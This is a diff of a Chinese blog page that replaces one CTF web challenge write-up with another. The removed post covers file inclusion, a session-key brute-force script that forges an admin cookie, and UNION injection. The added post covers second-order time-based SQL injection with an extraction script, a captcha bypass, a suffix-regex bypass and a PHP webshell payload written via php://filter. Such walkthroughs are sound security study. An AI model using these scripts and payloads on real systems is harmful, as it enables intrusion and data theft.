@@ -12,7 +12,7 @@
     
     
     
-    <title>蓝鲸笔记管理系统（塔主nb） | ruozhi</title>
+    <title>记一道 web 题 | ruozhi</title>
     <link href=”https://liey1.github.io“ rel=”prefetch” />
 
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -186,13 +186,13 @@
         <i class="fa fa-home"></i>
         <a href="https://liey1.github.io">ruozhi</a>
         >
-        <span>蓝鲸笔记管理系统（塔主nb）</span>
+        <span>记一道 web 题</span>
     </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="/2018/09/09/蓝鲸笔记管理系统/">蓝鲸笔记管理系统（塔主nb）</a>
+                <a href="/2018/12/16/记一道 web 题/">记一道 web 题</a>
             </h1>
         </div>
         <div class="tag-article">
@@ -200,12 +200,14 @@
             <span class="label label-gal">
                 <i class="fa fa-tags"></i>
                 
-                <a href="/tags/CTF/">CTF</a>
+                <a href="/tags/web/">web</a>, 
+                
+                <a href="/tags/ctf/">ctf</a>
                 
             </span>
             
             <span class="label label-gal">
-                <i class="fa fa-calendar"></i> 2018-09-09
+                <i class="fa fa-calendar"></i> 2018-12-16
             </span>
             
         </div>
@@ -215,17 +217,19 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="/2018/09/09/蓝鲸笔记管理系统/">蓝鲸笔记管理系统（塔主nb）</a>
+                    <a href="/2018/12/16/记一道 web 题/">记一道 web 题</a>
                 </h4>
             </div>
             <p>
-                <i class="fa fa-calendar"></i> 2018-09-09
+                <i class="fa fa-calendar"></i> 2018-12-16
             </p>
             <p>
                 
                 <i class="fa fa-tags"></i>
                 
-                <a href="/tags/CTF/">CTF</a>
+                <a href="/tags/web/">web</a>, 
+                
+                <a href="/tags/ctf/">ctf</a>
                 
                 
                 
@@ -233,82 +237,65 @@
         </center>
     </div>
     <div class="content-article">
-        <h4 id="蓝鲸官网"><a href="#蓝鲸官网" class="headerlink" title="蓝鲸官网"></a><a href="http://www.whaledu.com/" target="_blank" rel="noopener">蓝鲸官网</a></h4><h4 id="本题源码"><a href="#本题源码" class="headerlink" title="本题源码"></a><a href="http://bmob-cdn-21455.b0.upaiyun.com/2018/09/09/7490aba640f5756380392e7b8b4f97c6.zip" target="_blank" rel="noopener">本题源码</a></h4><hr>
-<p>首先先随便注册个，登陆看看：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/cc52eff0409f44bf80c7adaf12ea54fe.png" alt="前台"></p>
-<p>这里看到个提示一样的东西：访问 <code>/dbinit.sql</code> 拿到 数据库结构。</p>
-<p>再看看地址，首页的 url 地址为：<br><code>http://106.39.10.134:10002/index.php?action=front&amp;mode=index</code></p>
-<p>一开始还以为是 MVC 架构的，后来看了师傅的 WP 发现：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action=$_GET[<span class="string">'action'</span>];</span><br><span class="line">$mode=$_GET[<span class="string">'mode'</span>];</span><br><span class="line">$file=$action.<span class="string">'/'</span>.$mode.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>很明显的一个文件包含漏洞。用 <code>php://filter</code> 伪协议读取源码：</p>
-<p><code>/index.php?action=php://filter/read=convert.base64-encode/resource=front/&amp;mode=index</code></p>
-<p>但是这里读不出 <code>config.inc.php</code> 原因可以在 <code>index.php</code> 中看到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">else if(!preg_match(&apos;/\.&#123;2&#125;/is&apos;,$_GET[&apos;action&apos;])&amp;&amp;preg_match(&apos;/^[0-9A-Za-z]+$/is&apos;,$_GET[&apos;mode&apos;])</span><br></pre></td></tr></table></figure>
-<p>mode 中不能包含 <code>.</code></p>
+        <p>原文：<a href="https://www.anquanke.com/post/id/167637" target="_blank" rel="noopener">https://www.anquanke.com/post/id/167637</a></p>
 <hr>
-<p>共读取到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">common.php</span><br><span class="line">admin/index.php</span><br><span class="line">admin/login.php</span><br><span class="line">admin/setpagenum.php</span><br><span class="line">front/index.php</span><br><span class="line">front/login.php</span><br><span class="line">front/newnote.php</span><br><span class="line">front/register.php</span><br></pre></td></tr></table></figure></p>
-<p>我们可以看看 <code>admin/index.php</code> 中是怎么验证是否登陆的（别问为什么一上来就看这个）：</p>
-<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/d604a118405d4ac080cad091a15370c2.png" alt="后台首页"></p>
-<p>调用了 <code>check_login</code> 和 <code>get_level</code> 函数，这两个函数在 <code>common.php</code> 中。我们先看看这个文件的开头：</p>
-<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/954b0b56403c004580c6b260c9279692.png" alt="公共文件开头"></p>
-<p>很明显，这里进行了一些初始化操作。</p>
-<p>再来看看两个验证函数：</p>
-<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/9dca48914066fb13807322ce25d465ab.png" alt="公共文件"></p>
-<p>这里将 <code>cookie</code> 中的 <code>uid</code> 取出，以 <code>|</code>  分割，加密判断。</p>
-<p>如果成功返回当前 <code>$_SESSION</code> 中的值，否则返回 <code>False</code>。如果没登陆，那此时的值为 <code>NULL</code> ，但是判断使用的是 <code>严格</code> 判断，即：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(check_login()!==<span class="keyword">false</span>&amp;&amp;get_level()!==<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure>
-<p>这两个函数的绕过方法是一样的，所以下一步我们的目标就是研究：</p>
-<p><code>$userinfo[1]==encode($userinfo[0])</code></p>
-<p>这个条件怎么成立，这个数组是我们可控的，我们可以跟进 <code>encode</code> 函数中：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> md5($_SESSION[<span class="string">'SECURITY_KEY'</span>].$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>不难理解，翻上面发现：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;SECURITY_KEY&apos;]=rand_str(6);</span><br></pre></td></tr></table></figure>
-<p>来看看这个函数的实现：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_str</span><span class="params">($lenth=<span class="number">16</span>)</span></span>&#123;</span><br><span class="line">   $rand=[];</span><br><span class="line">   $_str=<span class="string">"wh"</span>;</span><br><span class="line">   <span class="keyword">while</span>($lenth)&#123;</span><br><span class="line">   $rand[]=$_str[rand(<span class="number">0</span>,strlen($_str)<span class="number">-1</span>)];</span><br><span class="line">   $lenth--;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//    var_dump($rand);</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> implode($rand);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p> 随机取6位 <code>w</code> 或 <code>h</code> </p>
+<p>这道题不算难吧。。（虽然看了 WP。。。）</p>
+<p>源码太长了，不贴了。原题里有。。贴一下数据库的代码吧：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">create database web500 charset=utf8;</span><br><span class="line">use web500;</span><br><span class="line">create table user(</span><br><span class="line"> id int key auto_increment,</span><br><span class="line"> user varchar(100),</span><br><span class="line"> pass varchar(100)</span><br><span class="line">);</span><br><span class="line">create table note(</span><br><span class="line"> id int key auto_increment,</span><br><span class="line"> user varchar(100),</span><br><span class="line"> title varchar(100),</span><br><span class="line"> content varchar(100)</span><br><span class="line">);</span><br><span class="line">insert user values(1,&quot;admin&quot;,&quot;admin123&quot;);</span><br></pre></td></tr></table></figure></p>
+<p>首先大致的看看几个函数：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/14/2b39f90940810071805150a75c074c4b.png" alt="1"></p>
+<p>可以发现这里查询的时候都把 <code>$user</code> 转成 <code>hex</code> 了。</p>
+<p>but。。。<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/14/537cb6ad40487893802dd250621e5519.png" alt="此处输入图片的描述"></p>
+<p>是的，这里没有 <code>tohex</code>。我们可以看看这个 <code>$user</code> 是哪里来的：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/14/b7ec0533401b3b638041451e801b3cb3.png" alt="此处输入图片的描述"></p>
+<p>可以看到这里 是从 <code>session</code> 获取的，那么 <code>seesion</code> 中的 <code>user</code> 是怎么来的呢？</p>
+<p>这里还注册了个 <code>$admin</code> 变量。记录登陆的用户是否为 <code>admin</code></p>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/14/9a9450c540877be0804c2c235561fae8.png" alt="此处输入图片的描述"></p>
+<p>登陆成功后，从 <code>$_POST[&#39;user&#39;]</code> 中提取的。</p>
+<p>利用流程：注册一个用户 -&gt; 登陆 -&gt; 添加note -&gt; 删除note。</p>
+<p>哦~至于为什么要 admin 的密码，我们可以看：</p>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/14/475fee504096616080164fcc057fc162.png" alt="此处输入图片的描述"></p>
+<p>最开始判断了是否为 <code>admin</code>。</p>
+<p>这里好像能写 <code>shell</code>，但是此处限制了文件名的后缀 ，怎么绕过这个 <code>preg_match</code> 呢？</p>
+<p>此处正则：<code>.+\.ph(p[3457]?|t|tml)$</code></p>
+<p>可以发现正则最后有个 <code>$</code>，即：<code>php/pht/pht</code> 这样的后缀才会被匹配，说白了就是最后不能是 <code>php/pht/phtml/ph2/3/4/5</code> 这样，但是 <code>phpa/phtb</code> 这样的后缀正则表达式就匹配不到了。。。。</p>
+<p>那么我们的后缀可以这样：  <code>php/.</code> ，因为 <code>/</code> 是路径分隔符（吧？），所以创建 <code>abc.php/.</code> 相当于写入 <code>abc.php</code>。</p>
 <hr>
-<p> 整理一下思路：</p>
-<p> 要想绕过登陆验证，就要让验证函数返回 <code>NULL</code>。</p>
-<p> 函数返回 <code>NULL</code> 的条件为：</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($userinfo[1]==encode($userinfo[0]))</span><br></pre></td></tr></table></figure>
-<p> $userinfo 是我们可以控制的，唯一不确定的是 encode 函数中用到的 <code>$_SESSION[&#39;SECURITY_KEY&#39;]</code></p>
-<p> 因为不对，所以我们写个脚本爆破：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import itertools</span><br><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">lst = itertools.product(&quot;wh&quot;, repeat=6)</span><br><span class="line">url = &quot;http://106.39.10.134:10002/index.php?action=admin&amp;mode=index&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def m(s):</span><br><span class="line">    return md5(s).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in lst:</span><br><span class="line">    key = m(&apos;&apos;.join(i) + &apos;admin&apos;)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Cookie&quot;: &quot;PHPSESSID=05ibpb1gtgmuq4ji4g5cgkvg07;uid=admin|&quot; + key</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    if r.text.find(&quot;not login&quot;) &lt; 0:</span><br><span class="line">        print(headers)</span><br></pre></td></tr></table></figure>
-<p>很快就会输出 <code>Cookie</code>，添加上浏览器，再访问 后台的 <code>index</code> 即可。。</p>
-<blockquote>
-<p>踩坑</p>
-</blockquote>
-<p>这里还有个坑，就是如果你当前的 SESSION 已经登陆过前台，那么爆破就会失败。原因可能是 <code>$_SESSION</code> 中登陆的用户的 <code>level</code> 为 0，在 <code>get_level</code> 函数中会返回 <code>False</code></p>
+<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>ok。回到前面，我们发现可以注入，我们此时试试注入处 <code>admin</code> 的密码，手动几乎不可能的，我们考虑用用脚本吧</p>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/14/a5499674403e85508056ab9ca8507363.png" alt="此处输入图片的描述"></p>
+<p>但是不管登陆注册我们都会发现有个这个，这个是判断验证码是否正确。。</p>
+<p>且这里不能一个验证码多次使用。。。</p>
+<p>但是。。。。这里并没有判断 <code>$_SESSION[&#39;answer&#39;]</code> 是否为空。</p>
+<p>而生成验证码的是一段 <code>html</code> ：<code>&lt;img src=&quot;valicode.php&quot;&gt;</code></p>
+<p>当我们直接请求 <code>register</code> 时会先解释 <code>php</code> 代码。如果此时 <code>answer</code> 还没生成，那么当我们传入的 <code>code</code> 为 空时：<code>&#39;&#39;==NULL</code> 成立。</p>
+<p>那怎么让他生成之前请求 <code>register</code> 呢？此处只需要把 <code>SESSION</code> 删了，即可。</p>
+<p>于是写个jo本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def register(user,passwd):</span><br><span class="line">    url=&quot;http://192.168.0.109/ctf/web500/test.php?action=register&quot;</span><br><span class="line">    requests.post(url,data=&#123;&quot;user&quot;:user,&quot;pass&quot;:passwd,&quot;code&quot;:&quot;&quot;&#125;)</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def login(user,passwd):</span><br><span class="line">    s = requests.session()</span><br><span class="line">    url=&quot;http://192.168.0.109/ctf/web500/test.php?action=login&quot;</span><br><span class="line">    s.post(url,data=&#123;&quot;user&quot;:user,&quot;pass&quot;:passwd,&quot;code&quot;:&quot;&quot;&#125;)</span><br><span class="line">    return s</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def delete_note(s):</span><br><span class="line">    url = &quot;http://192.168.0.109/ctf/web500/test.php?action=delete&amp;id=4&quot;</span><br><span class="line">    s.get(url)</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">payload = &quot;11&apos; or if(mid((select pass from user where user=&apos;admin&apos;),&#123;offset&#125;,1)=&apos;&#123;asc&#125;&apos;,sleep(5),0)=1 or 1=&apos;&quot;</span><br><span class="line">admin_pass = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    print &quot;admin_pass : &quot;,admin_pass</span><br><span class="line">    for a in &apos;abcdefghijklmnopqrstuvwxyz1234567890&apos;:</span><br><span class="line">        payload_tmp = payload.format(offset=i,asc=a)</span><br><span class="line">        register(payload_tmp,&apos;1234&apos;)</span><br><span class="line">        s = login(payload_tmp,&apos;1234&apos;)</span><br><span class="line">        t1 = time.time()</span><br><span class="line">        delete_note(s)</span><br><span class="line">        t2 = time.time()</span><br><span class="line"></span><br><span class="line">        if t2-t1&gt;3:</span><br><span class="line">            admin_pass+=a</span><br><span class="line">            break;</span><br></pre></td></tr></table></figure>
+<p>我一开始还碰到了些问题，，好像是 <code>and</code> 和 <code>or</code> 的问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(mid((select pass from user where user=&apos;admin&apos;),&#123;offset&#125;,1)=&apos;&#123;asc&#125;&apos;,sleep(5),0)=1 or 1=&apos;&apos;</span><br></pre></td></tr></table></figure></p>
+<p>如果最后的  <code>or 1=&#39;&#39;</code> 是 <code>and 1=&#39;&#39;</code> 的话，好像就不行。</p>
+<p>同样的可以参考：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from user where 1=(sleep(10)) and 1=&apos;&apos;; # 不触发 sleep</span><br><span class="line">select * from user where 1=(sleep(10)) and 1=1; # 触发 sleep</span><br><span class="line">select * from user where 1=1 and 1=(sleep(10)); # 触发 sleep</span><br><span class="line">select * from user where 1=&apos;&apos; and 1=(sleep(10)); # 不触发 sleep</span><br><span class="line">select * from user where 1=(sleep(3)) and 1=(sleep(10)); # 一直睡下去。。。</span><br></pre></td></tr></table></figure></p>
+<p>猜测可能是 如果 <code>where</code> 子句中有 <code>and</code> 先判断了耗时比较短的，如果耗时短的都不行那就没必要判断耗时长的了</p>
+<p>以上是瞎猜的。。反正用 <code>or</code> 就对了。。233</p>
+<p>但是好像有一些问题。。。会多跑出几个字符。。。md算了。。</p>
+<p>跑出密码后就可以登陆了，此时使用 <code>backup</code> 功能。</p>
+<p>发现 <code>php/.</code> 的后缀确实可以保存成 <code>php</code> 后缀的文件名，，但是：</p>
+<p>当我们执行 newnote 添加一个 <code>&lt;?php eval($_REQUEST[1])?&gt;</code> 的时候：</p>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/15/2c58c7bf4067983d802ae62d03b640d6.png" alt="此处输入图片的描述"></p>
+<p>这里使用了 <code>htmlspecialchars</code>：</p>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/15/da295fa640028701801e58b14012cde7.png" alt="此处输入图片的描述"></p>
+<p>于是便不能直接写一句话了。</p>
+<p>这时候：</p>
+<p>参考下p神的文章:<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
+<p>得知我们可以在 文件操作的地方使用 <code>php://filter</code> 伪协议</p>
+<p>我们可以 <code>add_note</code> 的时候添加：<br><code>base64_encode(&#39;&lt;?php eval($_REQUEST[1])?&gt;&#39;)</code><br>这个的结果：<br><code>PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pPz4</code></p>
+<p>此时调用 backup，文件名写：<br><code>php://filter/convert.base64-decode/resource=test.php/.</code></p>
+<p>注意这里是 <code>base64-decode</code>。。。</p>
+<p>至此就已经拿到 <code>shell</code> 了。。</p>
 <hr>
-<p>现在我们已经登陆了后台，看看后台的代码：</p>
-<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/d604a118405d4ac080cad091a15370c2.png" alt="后台首页"></p>
-<p>这里拼接了个 <code>get_page_size()</code>，这个函数在 <code>common.php</code> 里，我们看看这个函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function get_page_size()&#123;</span><br><span class="line">      $sql=&quot;select num from page&quot;;</span><br><span class="line">      $res=mysql_my_query($sql);</span><br><span class="line">      $row=$res-&gt;fetch_assoc();</span><br><span class="line">      return $row[&apos;num&apos;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>只做了很简单的查询。</p>
-<p>我们会发现后台页面还有个设置页面（<code>setpagenum.php</code>），进去看看：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/16bfd11e40309e538040b0c702fd600b.png" alt="后台设置页面"></p>
-<p>这个设置就是 <code>get_page_size</code> 查询并返回的表和字段，猜测关键点可能就在这了（别问为什么猜）。</p>
-<p>可以看到，这里做了 <code>is_numeric</code> 的判断，判断是否是数字。</p>
-<p>mysql 中允许这么玩：<br><code>select 0x313233;</code></p>
-<p>这条语句会输出 <code>123</code>，也就是 ASCII 码。</p>
-<p>但是不允许这么玩：</p>
-<p><code>select &#39;0x313233&#39;;</code></p>
-<p>注意这里加了单引号，此时输出 <code>0x313133</code></p>
-<p>我们发现这里是没有加引号的，所以我们传进来的值会在执行时解析成 ASCII 码。如果这是故意留的洞，那该字段的属性就不会是 <code>int</code>。因为 <code>int</code> 就不能存储字符串了。</p>
-<hr>
-<p>回顾一下查询语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$page_size=get_page_size();</span><br><span class="line">$sql=&quot;select * from note  limit 0,&quot;.$page_size;</span><br></pre></td></tr></table></figure>
-<p>思考能不能用这样的语句：select * from note  limit 0,1 union select 2 </p>
-<p>（！！！ 5.7 以后 limit 必须要放在最后，5.7以前是可以的）</p>
-<p>5.7 以后会报：<code>ERROR 1221 (HY000): Incorrect usage of UNION and LIMIT</code></p>
-<blockquote>
-<p>利用</p>
-</blockquote>
-<p>那么现在就可以利用了：</p>
-<p>在 <code>mysql</code> 里运行：</p>
-<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/997ec5b94098030380caea6f2dd04cc9.png" alt="mysql"></p>
-<p>这样我们就可以很方便的获得 <code>16进制</code> 了（只要转成 ASCII 就可以了）。</p>
-<p>加上 <code>0x</code> 填上去提交：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/5fca457a40b2c53b8013764d28921f51.png" alt="填"></p>
-<p>到前台：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/f23e901240efe71180c386fb77034312.png" alt="后台首页"></p>
-<p>可以看到 3  和 2 被显示出来了。。看回一开始拿到的数据库结构，发现有个<code>flags</code> 表和 <code>flag</code> 字段，构造一下就可以出来了。。</p>
-<h3 id="突然的结束，是因为懒"><a href="#突然的结束，是因为懒" class="headerlink" title="突然的结束，是因为懒"></a>突然的结束，是因为懒</h3>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这题使用到的 <code>trick</code> :</p>
+<ol>
+<li>二次注入</li>
+<li>删除 SESSION 的方式绕过验证码</li>
+<li>操作文件时使用 php://filter 伪协议。。</li>
+</ol>
+
     </div>
 </article>
 
@@ -427,10 +414,10 @@
             <ul class="nav nav-pills pills-gal">
                 
                 <li class="">
-                    <a href="/2018/09/09/蓝鲸笔记管理系统/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">我大哥的Blog</a>
+                    <a href="/2018/12/16/记一道 web 题/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">我大哥的Blog</a>
                 </li>
                 <li class="">
-                    <a href="/2018/09/09/蓝鲸笔记管理系统/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2018/12/16/记一道 web 题/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
             </ul>
             <div class="tab-content">
